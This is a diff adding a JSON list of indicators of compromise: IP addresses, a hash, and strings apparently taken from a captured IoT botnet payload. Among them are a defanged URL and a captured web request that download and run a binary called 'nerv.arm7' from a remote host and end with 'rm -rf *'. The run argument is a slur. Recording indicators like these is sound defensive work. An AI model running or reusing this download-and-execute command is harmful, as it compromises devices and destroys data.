@@ -1,0 +1,39 @@
+[
+  {
+    "context": "Embedded IP in inbound payload",
+    "source": "static_analysis",
+    "type": "ip",
+    "value": "190.179.140.XXX"
+  },
+  {
+    "context": "Embedded IP in inbound payload",
+    "source": "static_analysis",
+    "type": "ip",
+    "value": "93.115.101.XXX"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://93.115.101.XXX:13734/nerv.arm7;chmod+777+nerv.arm7;./nerv.arm7+jews;rm+-rf+*"
+  },
+  {
+    "context": "Inbound payload hash (unknown)",
+    "source": "static_analysis",
+    "type": "hash",
+    "value": "1993de3c5053515d7469ade3b5aa0b5e10985424cb6249e21f6ccb6e3f3db83f"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "GET /shell?cd+/tmp;rm+nerv.arm7;wget+http:/\\/hxxp://93.115.101.XXX:13734/nerv.arm7;chmod+777+nerv.arm7;./nerv.arm7+jews;"
+  },
+  {
+    "asn": "DigitalOcean, LLC",
+    "country": "United States",
+    "role": "artifact_source",
+    "type": "ip",
+    "value": "138.197.87.XXX"
+  }
+]
